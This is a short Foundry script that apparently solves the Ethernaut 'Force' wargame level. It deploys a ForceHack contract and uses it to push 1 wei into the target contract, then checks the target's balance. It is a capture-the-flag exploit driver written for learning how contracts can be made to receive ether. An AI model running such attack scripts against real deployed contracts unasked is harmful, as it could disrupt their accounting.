pragma solidity ^0.8.17;
import "forge-std/Script.sol";
import "../src/Force/Force.sol";
import "../src/Force/ForceHack.sol";

contract ForceScript is Script {
    function run() public {
        address forceAddress = vm.envAddress("FORCE_ADDRESS");
        Force ethernautForce = Force(payable(forceAddress));

        uint256 deployerKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerKey);

        ForceHack forceHack = new ForceHack();
        forceHack.hack{value: 1 wei}(address(ethernautForce));
        require(address(ethernautForce).balance > 0, "balance not greater than 0");

        vm.stopBroadcast();
        console.log("SUCCESS");
    }
}